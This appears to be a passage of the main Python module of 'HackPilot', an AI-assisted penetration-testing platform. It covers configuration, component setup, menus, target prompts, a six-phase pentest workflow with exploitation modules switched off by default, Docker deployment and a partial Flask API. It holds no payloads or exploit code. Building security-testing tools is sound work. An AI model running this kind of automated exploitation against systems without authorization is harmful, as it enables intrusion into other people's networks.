#!/usr/bin/env python3
# HackPilot core module
"""
HackPilot - Enterprise AI-Powered Penetration Testing Platform
Author: HackPilot Team
Version: 2026.10.23 (Production-Ready)
Description: Enterprise-grade pentesting automation platform with advanced AI, microservices architecture,
            and cloud-native capabilities for professional security assessments.

Features:
- Advanced AI Engine with ML pattern recognition
- Enterprise authentication and RBAC
- Real-time analytics and reporting
- Microservices architecture with Docker/Kubernetes support
- Performance optimization with caching and parallel processing
- Database persistence with PostgreSQL
- Compliance framework integration (OWASP, NIST, ISO27001, SOC2)
- Zero-day detection with behavioral analysis
"""

import os
import sys
import json
import re
import time
import asyncio
import argparse
import logging
import configparser
import subprocess
from datetime import datetime, timedelta
from pathlib import Path
import threading
import queue
import shlex
import hashlib
import uuid
from urllib.parse import urlparse
from typing import Dict, List, Any, Optional, Union

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# Core imports with fallback handling
def safe_import(module_name, package=None):
    """Safely import modules with error handling"""
    try:
        if package:
            return __import__(package, fromlist=[module_name])
        else:
            return __import__(module_name)
    except ImportError:
        return None

# Essential imports
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich.markdown import Markdown

# Optional imports
requests = safe_import('requests')
openai = safe_import('openai')
flask = safe_import('flask')
redis = safe_import('redis')
psycopg2 = safe_import('psycopg2')
sqlalchemy = safe_import('sqlalchemy')
docker = safe_import('docker')
consul = safe_import('consul')
jwt = safe_import('jwt')
bcrypt = safe_import('bcrypt')
sr = safe_import('speech_recognition')
pyttsx3 = safe_import('pyttsx3')
numpy = safe_import('numpy')
pandas = safe_import('pandas')

# Import our custom modules
try:
    from database import get_db_manager, PentestSession, Vulnerability, User, AuditLog
    from ai_engine import (
        get_advanced_ai_engine,
        CVEIntelligenceEngine,
        AttackChainingEngine,
        AttackGraph,
        LLMRedTeamEngine,
    )
    from security import (
        EnterpriseAuth, ComplianceFrameworkMapper, get_soc_analyzer,
        SIEMConnectorManager, SplunkConnector, QRadarConnector,
        ElasticsearchConnector, WebhookConnector, SIEMConnectorType,
        APISecurityScanner, CSPMScanner,
    )
    from exploitation import AdvancedExploitationEngine, ZeroDayDetector
    from reporting import DynamicReportGenerator, get_realtime_dashboard
    from cloud import DockerManager, KubernetesManager, ServiceRegistry
    from performance import get_cache_manager, get_parallel_processor
    MODULES_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Some modules not available: {e}")
    MODULES_AVAILABLE = False

# Initialize Rich Console
console = Console()

# Configuration
class Config:
    """Application configuration manager"""
    
    def __init__(self, config_file: str = "config.ini"):
        self.config = configparser.ConfigParser()
        self.config_file = config_file
        self.load_config()
        
        # Environment variables override config file
        self.DATABASE_URL = os.getenv("DATABASE_URL", self.config.get("database", "url", fallback=""))
        self.REDIS_URL = os.getenv("REDIS_URL", self.config.get("cache", "redis_url", fallback="redis://localhost:6379/0"))
        self.OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", self.config.get("ai", "openai_api_key", fallback=""))
        self.HACKPILOT_MODEL = os.getenv("HACKPILOT_MODEL", os.getenv("HACKPILOT_MODEL", self.config.get("ai", "model", fallback="gpt-4o")))
        self.HACKPILOT_MODEL = self.HACKPILOT_MODEL
        self.HACKPILOT_PROVIDER = os.getenv("HACKPILOT_PROVIDER", os.getenv("HACKPILOT_PROVIDER", self.config.get("ai", "provider", fallback="")))
        self.HACKPILOT_PROVIDER = self.HACKPILOT_PROVIDER
        self.HACKPILOT_CUSTOM_ROUTE = os.getenv(
            "HACKPILOT_CUSTOM_ROUTE",
            os.getenv(
                "HACKPILOT_CUSTOM_ROUTE",
                os.getenv("CUSTOM_ROUTER_BASE_URL", self.config.get("ai", "custom_route", fallback="")),
            ),
        )
        self.HACKPILOT_CUSTOM_ROUTE = self.HACKPILOT_CUSTOM_ROUTE
        self.OPENROUTER_BASE_URL = os.getenv("OPENROUTER_BASE_URL", self.config.get("ai", "openrouter_base_url", fallback="https://openrouter.ai/api/v1"))
        self.OPENROUTER_API_KEY = os.getenv("OPENROUTER_API_KEY", self.config.get("ai", "openrouter_api_key", fallback=""))
        self.ORCAROUTER_BASE_URL = os.getenv("ORCAROUTER_BASE_URL", self.config.get("ai", "orcarouter_base_url", fallback="https://api.orcarouter.ai/v1"))
        self.ORCAROUTER_API_KEY = os.getenv("ORCAROUTER_API_KEY", self.config.get("ai", "orcarouter_api_key", fallback=""))
        self.NINEBROUTER_BASE_URL = os.getenv("NINEBROUTER_BASE_URL", self.config.get("ai", "ninebrouter_base_url", fallback="http://localhost:8000/v1"))
        self.NINEBROUTER_API_KEY = os.getenv("NINEBROUTER_API_KEY", self.config.get("ai", "ninebrouter_api_key", fallback=""))
        self.CUSTOM_ROUTER_BASE_URL = os.getenv("CUSTOM_ROUTER_BASE_URL", self.config.get("ai", "custom_router_base_url", fallback="http://localhost:8080/v1"))
        self.CUSTOM_ROUTER_API_KEY = os.getenv("CUSTOM_ROUTER_API_KEY", self.config.get("ai", "custom_router_api_key", fallback=""))
        self.SECRET_KEY = os.getenv("SECRET_KEY", self.config.get("security", "secret_key", fallback=str(uuid.uuid4())))
        self.LDAP_SERVER = os.getenv("LDAP_SERVER", self.config.get("ldap", "server", fallback=""))
        self.LDAP_BIND_DN = os.getenv("LDAP_BIND_DN", self.config.get("ldap", "bind_dn", fallback=""))
        self.LDAP_BIND_PASSWORD = os.getenv("LDAP_BIND_PASSWORD", self.config.get("ldap", "bind_password", fallback=""))
        
        # Application settings
        self.DEBUG = self.config.getboolean("app", "debug", fallback=False)
        self.LOG_LEVEL = self.config.get("app", "log_level", fallback="INFO")
        self.MAX_WORKERS = self.config.getint("performance", "max_workers", fallback=10)
        self.ENABLE_VOICE = self.config.getboolean("features", "enable_voice", fallback=True)
        self.ENABLE_WEB_DASHBOARD = self.config.getboolean("features", "enable_web_dashboard", fallback=True)
        self.ENABLE_REALTIME_DASHBOARD = self.config.getboolean("features", "enable_realtime_dashboard", fallback=True)
        # Safe by default: real/simulated exploitation only runs if the operator
        # explicitly opts in via .env. See phase4_exploitation.
        self.ENABLE_AUTO_EXPLOIT = os.getenv("ENABLE_AUTO_EXPLOIT", "false").strip().lower() == "true"
        self.ENABLE_ADVANCED_EXPLOITATION = os.getenv("ENABLE_ADVANCED_EXPLOITATION", "false").strip().lower() == "true"
        
        # Cloud settings
        self.DOCKER_HOST = os.getenv("DOCKER_HOST", self.config.get("cloud", "docker_host", fallback="unix:///var/run/docker.sock"))
        self.KUBERNETES_CONFIG = os.getenv("KUBECONFIG", self.config.get("cloud", "kubernetes_config", fallback=""))
        self.SERVICE_REGISTRY_BACKEND = self.config.get("cloud", "service_registry_backend", fallback="memory")
    
    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(self.config_file):
            self.config.read(self.config_file)
        else:
            self.create_default_config()
    
    def create_default_config(self):
        """Create default configuration file"""
        sections = {
            "app": {"debug": "false", "log_level": "INFO"},
            "database": {"url": ""},
            "cache": {"redis_url": "redis://localhost:6379/0"},
            "ai": {"openai_api_key": "", "local_model": "llama2:7b"},
            "security": {"secret_key": str(uuid.uuid4()), "jwt_algorithm": "HS256", "jwt_expiry": "3600"},
            "ldap": {"server": "", "bind_dn": "", "bind_password": ""},
            "performance": {"max_workers": "10", "cache_ttl": "3600"},
            "features": {"enable_voice": "true", "enable_web_dashboard": "true", "enable_realtime_dashboard": "true"},
            "cloud": {"docker_host": "unix:///var/run/docker.sock", "kubernetes_config": "", "service_registry_backend": "memory"}
        }
        
        for section_name, options in sections.items():
            self.config.add_section(section_name)
            for option, value in options.items():
                self.config.set(section_name, option, value)
        
        with open(self.config_file, 'w') as f:
            self.config.write(f)

# Initialize configuration
config = Config()

# OrcaRouter credentials follow the project's existing conventions: the
# environment variable first, then the operator-managed config.ini entry.
try:
    from ai_engine.orcarouter import credential_store as _orca_credential_store

    _orca_credential_store.set_config_reader(
        lambda: getattr(config, "ORCAROUTER_API_KEY", "") or ""
    )
except Exception:  # pragma: no cover - optional dependency guard
    pass

# Setup logging
log_dir = Path("/var/log")
if not log_dir.exists() or not os.access(log_dir, os.W_OK):
    log_dir = Path.cwd() / "logs"
    log_dir.mkdir(exist_ok=True)

logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_dir / 'hackpilot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('hackpilot')

# ASCII Banner
BANNER = """
[bold red]
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██████╗ ██╗██╗      ██████╗ ████████╗
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██║██║     ██╔═══██╗╚══██╔══╝
    ███████║███████║██║     █████╔╝ ██████╔╝██║██║     ██║   ██║   ██║   
    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔═══╝ ██║██║     ██║   ██║   ██║   
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║     ██║███████╗╚██████╔╝   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝    ╚═╝   
[/bold red]
[bold cyan]      Enterprise AI-Powered Penetration Testing Platform v2026.10.23[/bold cyan]
[bold green]        Production-Ready | Cloud-Native | AI-Enhanced[/bold green]
[dim]                    Advanced Security Assessment Platform[/dim]
"""

class EnterpriseHackPilot:
    """Main HackPilot Enterprise Application"""
    
    def __init__(self, model: str = None, provider: str = None, custom_route: str = None):
        self.config = config
        self.model_id = model or config.HACKPILOT_MODEL
        self.provider_name = provider or config.HACKPILOT_PROVIDER
        self.custom_route = custom_route or config.HACKPILOT_CUSTOM_ROUTE
        self.console = Console()
        self.logger = logging.getLogger('hackpilot.main')
        
        # Initialize components
        self.initialize_components()
        
        # Initialize services
        self.initialize_services()
        
        # Setup signal handlers
        self.setup_signal_handlers()
        
    def initialize_components(self):
        """Initialize core components"""
        # Initialize all attributes first with fallback values
        self.auth = None
        self.cache = None  
        self.processor = None
        self.compliance = None
        self.db = None
        self.soc_analyzer = None
        self.siem_manager = None
        self.llm_red_team = None
        self.api_scanner = None
        self.cspm_scanner = None
        
        try:
            # Database
            if MODULES_AVAILABLE:
                self.db = get_db_manager()
                self.console.print("[green]✓[/green] Database connection initialized")
            else:
                self.db = None
                self.console.print("[yellow]⚠[/yellow] Database not available")
            
            # AI Engine
            has_ai_credentials = bool(
                config.OPENAI_API_KEY
                or os.getenv("OPENROUTER_API_KEY")
                or os.getenv("ORCAROUTER_API_KEY")
                or os.getenv("NINEBROUTER_BASE_URL")
                or os.getenv("CUSTOM_ROUTER_BASE_URL")
                or os.getenv("HACKPILOT_CUSTOM_ROUTE")
                or os.getenv("ANTHROPIC_API_KEY")
                or os.getenv("GOOGLE_API_KEY")
                or os.getenv("DEEPSEEK_API_KEY")
                or os.getenv("LITELLM_API_KEY")
                or getattr(self, "custom_route", None)
                or self.check_local_llm()
            )
            if MODULES_AVAILABLE and has_ai_credentials:
                try:
                    self.ai_engine = get_advanced_ai_engine(
                        model_id=self.model_id,
                        provider=self.provider_name,
                        custom_route=self.custom_route,
                    )
                    self.console.print(f"[green]✓[/green] Advanced AI Engine initialized (model: {self.model_id})")
                except Exception as exc:
                    self.logger.warning("Could not initialize advanced AI engine: %s; using fallback", exc)
                    self.ai_engine = self.create_fallback_ai()
                    self.console.print("[yellow]⚠[/yellow] Using fallback AI engine")
            else:
                self.ai_engine = self.create_fallback_ai()
                self.console.print("[yellow]⚠[/yellow] Using fallback AI engine")
            
            # Authentication
            if MODULES_AVAILABLE:
                try:
                    self.auth = EnterpriseAuth()
                    self.console.print("[green]✓[/green] Enterprise authentication initialized")
                except Exception as e:
                    self.auth = None
                    self.console.print(f"[yellow]⚠[/yellow] Authentication not available: {str(e)}")
            else:
                self.auth = None
                self.console.print("[yellow]⚠[/yellow] Authentication not available")
            
            # Cache Manager
            if MODULES_AVAILABLE:
                try:
                    self.cache = get_cache_manager()
                    self.console.print("[green]✓[/green] Cache manager initialized")
                except Exception as e:
                    self.cache = None
                    self.console.print(f"[yellow]⚠[/yellow] Cache not available: {str(e)}")
            else:
                self.cache = None
                self.console.print("[yellow]⚠[/yellow] Cache not available")
            
            # Parallel Processor
            if MODULES_AVAILABLE:
                try:
                    self.processor = get_parallel_processor()
                    self.console.print("[green]✓[/green] Parallel processor initialized")
                except Exception as e:
                    self.processor = None
                    self.console.print(f"[yellow]⚠[/yellow] Parallel processing not available: {str(e)}")
            else:
                self.processor = None
                self.console.print("[yellow]⚠[/yellow] Parallel processing not available")
            
            # Tool Manager
            self.tool_manager = EnterpriseToolManager()
            self.console.print("[green]✓[/green] Enterprise tool manager initialized")
            
            # Compliance Framework
            if MODULES_AVAILABLE:
                self.compliance = ComplianceFrameworkMapper()
                self.console.print("[green]✓[/green] Compliance framework initialized")
            else:
                self.compliance = None
                self.console.print("[yellow]⚠[/yellow] Compliance framework not available")
            
            # Exploitation Engine
            if MODULES_AVAILABLE:
                self.exploitation = AdvancedExploitationEngine()
                self.zero_day_detector = ZeroDayDetector()
                self.console.print("[green]✓[/green] Advanced exploitation engine initialized")
            else:
                self.exploitation = None
                self.zero_day_detector = None
                self.console.print("[yellow]⚠[/yellow] Advanced exploitation not available")
            
            # Reporting
            if MODULES_AVAILABLE:
                self.report_generator = DynamicReportGenerator()
                self.console.print("[green]✓[/green] Dynamic report generator initialized")
            else:
                self.report_generator = BasicReportGenerator()
                self.console.print("[yellow]⚠[/yellow] Using basic report generator")
            
            # SOC Analysis Engine
            if MODULES_AVAILABLE:
                self.soc_analyzer = get_soc_analyzer()
                self.siem_manager = SIEMConnectorManager()
                self.console.print("[green]✓[/green] Advanced SOC Analysis Engine initialized")
                self.console.print("[green]✓[/green] SIEM Integration Connector Manager initialized")
            else:
                self.soc_analyzer = None
                self.siem_manager = None
                self.console.print("[yellow]⚠[/yellow] Advanced SOC Analysis Engine not available")
            
            # Threat Intelligence & Attack Graph Chaining
            if MODULES_AVAILABLE:
                try:
                    self.cve_intel = CVEIntelligenceEngine()
                    self.attack_chainer = AttackChainingEngine()
                    self.llm_red_team = LLMRedTeamEngine()
                    self.api_scanner = APISecurityScanner()
                    self.cspm_scanner = CSPMScanner()
                    self.console.print("[green]✓[/green] CVE Threat Intelligence Engine initialized")
                    self.console.print("[green]✓[/green] Automated Attack Graph Chainer initialized")
                    self.console.print("[green]✓[/green] AI Red Teaming & LLM Security Engine initialized")
                    self.console.print("[green]✓[/green] API Security & OpenAPI Scanner initialized")
                    self.console.print("[green]✓[/green] Cloud Security Posture (CSPM) & K8s Auditor initialized")
                except Exception as e:
                    self.cve_intel = None
                    self.attack_chainer = None
                    self.llm_red_team = None
                    self.api_scanner = None
                    self.cspm_scanner = None
                    self.console.print(f"[yellow]⚠[/yellow] Threat intelligence / Red Team / API / CSPM Scanner unavailable: {e}")
            else:
                self.cve_intel = None
                self.attack_chainer = None
                self.llm_red_team = None
                self.api_scanner = None
                self.cspm_scanner = None
            
        except Exception as e:
            self.logger.error(f"Error initializing components: {e}")
            self.console.print(f"[red]Error initializing components: {e}[/red]")
    
    def initialize_services(self):
        """Initialize enterprise services"""
        try:
            # Cloud services
            if MODULES_AVAILABLE and docker:
                self.docker_manager = DockerManager()
                self.console.print("[green]✓[/green] Docker manager initialized")
            else:
                self.docker_manager = None
                self.console.print("[yellow]⚠[/yellow] Docker not available")
            
            if MODULES_AVAILABLE:
                self.k8s_manager = KubernetesManager()
                self.service_registry = ServiceRegistry(backend=config.SERVICE_REGISTRY_BACKEND)
                self.console.print("[green]✓[/green] Cloud services initialized")
            else:
                self.k8s_manager = None
                self.service_registry = None
                self.console.print("[yellow]⚠[/yellow] Cloud services not available")
            
            # Voice interface
            if config.ENABLE_VOICE and sr and pyttsx3:
                self.voice_interface = EnterpriseVoiceInterface()
                self.console.print("[green]✓[/green] Voice interface initialized")
            else:
                self.voice_interface = None
                self.console.print("[yellow]⚠[/yellow] Voice interface not available")
            
            # Web dashboard
            if config.ENABLE_WEB_DASHBOARD and flask:
                self.web_dashboard = EnterpriseWebDashboard(self)
                self.console.print("[green]✓[/green] Web dashboard initialized")
            else:
                self.web_dashboard = None
                self.console.print("[yellow]⚠[/yellow] Web dashboard not available")
            
            # Real-time dashboard
            if config.ENABLE_REALTIME_DASHBOARD and MODULES_AVAILABLE:
                self.realtime_dashboard = get_realtime_dashboard()
                self.console.print("[green]✓[/green] Real-time dashboard initialized")
            else:
                self.realtime_dashboard = None
                self.console.print("[yellow]⚠[/yellow] Real-time dashboard not available")
            
        except Exception as e:
            self.logger.error(f"Error initializing services: {e}")
            self.console.print(f"[red]Error initializing services: {e}[/red]")
    
    def check_local_llm(self):
        """Check if local LLM is available"""
        try:
            result = subprocess.run(['which', 'ollama'], capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            self.logger.debug("check_local_llm failed: %s", e)
            return False
    
    def create_fallback_ai(self):
        """Create fallback AI engine"""
        class FallbackAI:
            def __init__(self):
                self.console = Console()
            
            def analyze(self, context, data, phase="general"):
                return f"[Fallback AI Analysis]\nContext: {context}\nPhase: {phase}\nRecommendation: Please configure AI engine for detailed analysis."
            
            def correlate_vulnerabilities(self, vulnerabilities):
                return {"correlation": "basic", "risk_score": 5.0}
            
            def generate_exploit_suggestions(self, vulnerability_data):
                return ["Manual verification recommended", "Check CVE database", "Test with standard tools"]
            
            def detect_anomalies(self, data):
                return {"anomalies": [], "confidence": 0.0}
        
        return FallbackAI()
    
    def setup_signal_handlers(self):
        """Setup graceful shutdown signal handlers"""
        import signal
        
        def signal_handler(signum, frame):
            self.logger.info(f"Received signal {signum}, shutting down gracefully...")
            self.shutdown()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def show_banner(self):
        """Display the HackPilot banner with system status"""
        self.console.print(BANNER)
        
        # System status
        status_table = Table(title="System Status", show_header=True)
        status_table.add_column("Component", style="cyan")
        status_table.add_column("Status", style="green")
        status_table.add_column("Version", style="yellow")
        
        components = [
            ("Database", "✓ Connected" if self.db else "⚠ Not Available", "PostgreSQL"),
            ("AI Engine", "✓ Advanced" if MODULES_AVAILABLE else "⚠ Fallback", "ML-Enhanced"),
            ("Authentication", "✓ Enterprise" if self.auth else "⚠ Basic", "RBAC+LDAP"),
            ("Cache", "✓ Multi-Layer" if self.cache else "⚠ None", "Redis+Memory"),
            ("Parallel Processing", "✓ Available" if self.processor else "⚠ Sequential", f"{config.MAX_WORKERS} workers"),
            ("Cloud Services", "✓ Ready" if self.docker_manager else "⚠ Not Available", "Docker+K8s"),
            ("Compliance", "✓ Integrated" if self.compliance else "⚠ Manual", "OWASP+NIST"),
            ("Real-time Dashboard", "✓ Active" if self.realtime_dashboard else "⚠ Disabled", "WebSocket"),
            ("SOC Analysis", "✓ Active" if self.soc_analyzer else "⚠ Disabled", "ATT&CK+Rules"),
            ("AI Red Teaming", "✓ Active" if self.llm_red_team else "⚠ Disabled", "OWASP LLM v2026"),
            ("API Scanner", "✓ Active" if self.api_scanner else "⚠ Disabled", "OWASP API Top 10"),
            ("CSPM Scanner", "✓ Active" if self.cspm_scanner else "⚠ Disabled", "CIS Benchmarks / KSPM")
        ]
        
        for name, status, version in components:
            status_table.add_row(name, status, version)
        
        self.console.print(status_table)
    
    def show_main_menu(self):
        """Display enhanced main menu"""
        menu_table = Table(title="HackPilot Enterprise Main Menu", show_header=True)
        menu_table.add_column("Option", style="cyan", width=8)
        menu_table.add_column("Category", style="magenta", width=20)
        menu_table.add_column("Description", style="white")
        
        menu_options = [
            ("1", "Assessment", "Full Enterprise Pentest (All 6 Phases)"),
            ("2", "Assessment", "Run Specific Phase"),
            ("3", "Assessment", "Custom Assessment Workflow"),
            ("4", "Reporting", "View Reports & Analytics"),
            ("5", "Reporting", "Generate Executive Summary"),
            ("6", "Reporting", "Real-time Dashboard"),
            ("7", "Administration", "User & Permission Management"),
            ("8", "Administration", "System Configuration"),
            ("9", "Administration", "Compliance Management"),
            ("10", "Cloud", "Cloud & Container Management"),
            ("11", "AI", "AI Engine Configuration"),
            ("12", "Tools", "Tool Management & Updates"),
            ("13", "API", "Start API Server"),
            ("14", "Voice", "Voice Command Mode"),
            ("15", "Web", "Launch Web Dashboard"),
            ("16", "SOC", "Advanced SOC Analysis"),
            ("17", "AI & Intel", "Threat Intel & Attack Graph Chaining"),
            ("18", "AI Red Team", "AI Red Teaming & LLM Assessment (OWASP Top 10)"),
            ("19", "API Security", "API Security Assessment & OpenAPI Audit"),
            ("20", "Cloud Security", "Cloud Security Posture & K8s Audit (CSPM/KSPM)"),
            ("0", "System", "Exit Application")
        ]
        
        for option, category, description in menu_options:
            menu_table.add_row(option, category, description)
        
        self.console.print(menu_table)
    
    def get_target_info(self):
        """Get comprehensive target information"""
        self.console.print(Panel("[bold cyan]Target Information Collection[/bold cyan]"))
        
        target = Prompt.ask("[cyan]Enter target (IP/domain/CIDR)[/cyan]")
        scope = Prompt.ask("[cyan]Enter scope description[/cyan]")
        
        # Assessment type
        assessment_types = ["black-box", "white-box", "gray-box"]
        assessment_type = Prompt.ask(
            "[cyan]Assessment type[/cyan]",
            choices=assessment_types,
            default="black-box"
        )
        
        # Compliance frameworks
        if self.compliance:
            frameworks = ["OWASP", "NIST", "ISO27001", "SOC2", "PCI-DSS"]
            compliance_framework = Prompt.ask(
                "[cyan]Compliance framework[/cyan]",
                choices=frameworks,
                default="OWASP"
            )
        else:
            compliance_framework = "OWASP"
        
        # Authorization
        auth_key = Prompt.ask("[cyan]Enter authorization key[/cyan]", password=True)
        
        # Additional options
        parallel_execution = Confirm.ask("[cyan]Enable parallel execution?[/cyan]", default=True)
        ai_enhanced = Confirm.ask("[cyan]Enable AI-enhanced analysis?[/cyan]", default=True)
        
        return {
            "target": target,
            "scope": scope,
            "assessment_type": assessment_type,
            "compliance_framework": compliance_framework,
            "auth_key": auth_key,
            "parallel_execution": parallel_execution,
            "ai_enhanced": ai_enhanced,
            "timestamp": datetime.utcnow()
        }
    
    def run_full_enterprise_pentest(self, target_info=None):
        """Run comprehensive enterprise penetration test"""
        if not target_info:
            target_info = self.get_target_info()
            if not target_info["target"]:
                return
        
        self.console.print(f"[green]Starting Enterprise Pentest: {target_info['target']}[/green]")
        
        # Create session in database
        if self.db:
            session_id = self.db.create_pentest_session(
                target=target_info["target"],
                scope=target_info["scope"],
                created_by=target_info.get("created_by", "system"),
                auth_key=target_info.get("auth_key", "default_key"),
                assessment_type=target_info.get("assessment_type", "black-box")
            )
        else:
            session_id = str(uuid.uuid4())
        
        # Initialize enterprise pentesting phases
        phases = EnterprisePentestingPhases(
            session_id=session_id,
            ai_engine=self.ai_engine,
            tool_manager=self.tool_manager,
            target_info=target_info,
            db=self.db,
            cache=self.cache,
            processor=self.processor,
            exploitation=self.exploitation,
            zero_day_detector=self.zero_day_detector,
            compliance=self.compliance,
            report_generator=self.report_generator
        )
        
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=self.console
            ) as progress:
                
                # Execute all phases
                phase_tasks = [
                    ("Phase 1: Intelligence Gathering & Reconnaissance", phases.phase1_reconnaissance),
                    ("Phase 2: Advanced Scanning & Enumeration", phases.phase2_scanning_enumeration),
                    ("Phase 3: Vulnerability Assessment", phases.phase3_vulnerability_assessment),
                    ("Phase 4: Exploitation & Post-Exploitation", phases.phase4_exploitation),
                    ("Phase 5: Enterprise Reporting & Analytics", phases.phase5_reporting),
                    ("Phase 6: Verification & Retesting", phases.phase6_retesting)
                ]
                
                for phase_name, phase_method in phase_tasks:
                    task = progress.add_task(phase_name, total=100)
                    progress.update(task, advance=10)
                    
                    result = phase_method()
                    progress.update(task, completed=100)
                    
                    if not result.get("success", True):
                        self.console.print(f"[red]Phase failed: {phase_name}[/red]")
                        break
            
            self.console.print("[bold green]Enterprise Pentest Completed Successfully![/bold green]")
            
            if self.db:
                self.db.update_session_status(session_id, "completed", "system")
            
            # Show summary
            self.show_pentest_summary(session_id, phases.results)
            
        except KeyboardInterrupt:
            self.console.print("[yellow]Pentest interrupted by user[/yellow]")
            if self.db:
                self.db.update_session_status(session_id, "cancelled", "system")
        except Exception as e:
            self.logger.error(f"Error during pentest: {e}")
            self.console.print(f"[red]Error during pentest: {e}[/red]")
            if self.db:
                self.db.update_session_status(session_id, "failed", "system")
    
    def show_pentest_summary(self, session_id: str, results: Dict):
        """Show pentest summary"""
        summary_table = Table(title=f"Pentest Summary - Session {session_id[:8]}")
        summary_table.add_column("Phase", style="cyan")
        summary_table.add_column("Status", style="green")
        summary_table.add_column("Findings", style="yellow")
        summary_table.add_column("Risk Score", style="red")
        
        for phase_name, phase_results in results.items():
            status = "✓ Complete" if phase_results.get("success") else "✗ Failed"
            findings_count = len(phase_results.get("vulnerabilities", []))
            risk_score = phase_results.get("risk_score", 0.0)
            
            summary_table.add_row(
                phase_name.replace("_", " ").title(),
                status,
                str(findings_count),
                f"{risk_score:.1f}"
            )
        
        self.console.print(summary_table)
    
    def manage_cloud_services(self):
        """Manage cloud and container services"""
        if not self.docker_manager:
            self.console.print("[red]Cloud services not available[/red]")
            return
        
        cloud_menu = Table(title="Cloud & Container Management")
        cloud_menu.add_column("Option", style="cyan")
        cloud_menu.add_column("Description", style="white")
        
        cloud_options = [
            ("1", "View Docker Containers"),
            ("2", "Deploy HackPilot Stack"),
            ("3", "Kubernetes Management"),
            ("4", "Service Registry Status"),
            ("5", "Scale Services"),
            ("0", "Return to Main Menu")
        ]
        
        for option, description in cloud_options:
            cloud_menu.add_row(option, description)
        
        self.console.print(cloud_menu)
        
        choice = Prompt.ask("[cyan]Select option[/cyan]", 
                          choices=[opt[0] for opt in cloud_options])
        
        if choice == "1":
            self.show_docker_status()
        elif choice == "2":
            self.deploy_hackpilot_stack()
        elif choice == "3":
            self.manage_kubernetes()
        elif choice == "4":
            self.show_service_registry_status()
        elif choice == "5":
            self.scale_services()
    
    def show_docker_status(self):
        """Show Docker container status"""
        try:
            if self.docker_manager.is_docker_available():
                containers = self.docker_manager.client.containers.list(all=True)
                
                if containers:
                    container_table = Table(title="Docker Containers")
                    container_table.add_column("Name", style="cyan")
                    container_table.add_column("Image", style="yellow")
                    container_table.add_column("Status", style="green")
                    container_table.add_column("Ports", style="blue")
                    
                    for container in containers:
                        ports = ", ".join([f"{p['HostPort']}:{p['PrivatePort']}" 
                                         for p in container.attrs['NetworkSettings']['Ports'].values() 
                                         if p]) if container.attrs['NetworkSettings']['Ports'] else "None"
                        
                        container_table.add_row(
                            container.name,
                            container.image.tags[0] if container.image.tags else "Unknown",
                            container.status,
                            ports
                        )
                    
                    self.console.print(container_table)
                else:
                    self.console.print("[yellow]No Docker containers found[/yellow]")
            else:
                self.console.print("[red]Docker not available[/red]")
        except Exception as e:
            self.console.print(f"[red]Error accessing Docker: {e}[/red]")
    
    def deploy_hackpilot_stack(self):
        """Deploy HackPilot microservices stack"""
        """Deploy HackPilot microservices stack"""
        if not self.docker_manager:
            return
        
        self.console.print("[cyan]Deploying HackPilot Enterprise Stack...[/cyan]")
        
        # Create services configuration
        from cloud.docker_manager import ServiceDefinition, ContainerConfig
        
        services = [
            ServiceDefinition(
                service_name="hackpilot-api",
                container_config=ContainerConfig(
                    name="hackpilot-api",
                    image="hackpilot/api:latest",
                    ports={"8000": 8000},
                    environment={"DATABASE_URL": config.DATABASE_URL, "REDIS_URL": config.REDIS_URL},
                    volumes={"/app/logs": "/var/log/hackpilot"}
                ),
                dependencies=[],
                health_check={"test": ["CMD", "curl", "-f", "http://localhost:8000/health"]},
                scaling={"min_replicas": 1, "max_replicas": 5}
            ),
            ServiceDefinition(
                service_name="hackpilot-worker",
                container_config=ContainerConfig(
                    name="hackpilot-worker",
                    image="hackpilot/worker:latest",
                    environment={"DATABASE_URL": config.DATABASE_URL, "REDIS_URL": config.REDIS_URL}
                ),
                dependencies=["hackpilot-database", "hackpilot-redis"],
                health_check={"test": ["CMD", "python", "-c", "import sys; sys.exit(0)"]},
                scaling={"min_replicas": 2, "max_replicas": 10}
            )
        ]
        
        # Generate docker-compose file
        compose_content = self.docker_manager.generate_docker_compose(services)
        
        # Deploy stack
        success = self.docker_manager.deploy_stack(compose_content, "hackpilot-enterprise")
        
        if success:
            self.console.print("[green]✓ HackPilot Enterprise Stack deployed successfully[/green]")
        else:
            self.console.print("[red]✗ Failed to deploy HackPilot Enterprise Stack[/red]")
    
    def start_api_server(self):
        """Start HackPilot API server"""
        if not flask:
            self.console.print("[red]Flask not available for API server[/red]")
            return
        
        from flask import Flask, request, jsonify, Response
        from flask_cors import CORS
        try:
            from prometheus_client import CONTENT_TYPE_LATEST, generate_latest
        except ImportError:
            CONTENT_TYPE_LATEST = 'text/plain; version=0.0.4; charset=utf-8'

            def generate_latest():
                return (
                    b"# HELP hackpilot_app_up HackPilot API metrics endpoint status\n"
                    b"# TYPE hackpilot_app_up gauge\n"
                    b"hackpilot_app_up 1\n"
                )
        
        app = Flask(__name__)
        CORS(app)
        app.secret_key = config.SECRET_KEY
        
        @app.route('/api/health', methods=['GET'])
        def health_check():
            return jsonify({
                "status": "healthy",
                "version": "2026.10.23",
                "timestamp": datetime.utcnow().isoformat()
            })

        @app.route('/metrics', methods=['GET'])
        def metrics():
            return Response(generate_latest(), content_type=CONTENT_TYPE_LATEST)
        
        @app.route('/api/pentest/start', methods=['POST'])
        def start_pentest():
            try:
                data = request.json
                target_info = {
                    "target": data.get("target"),
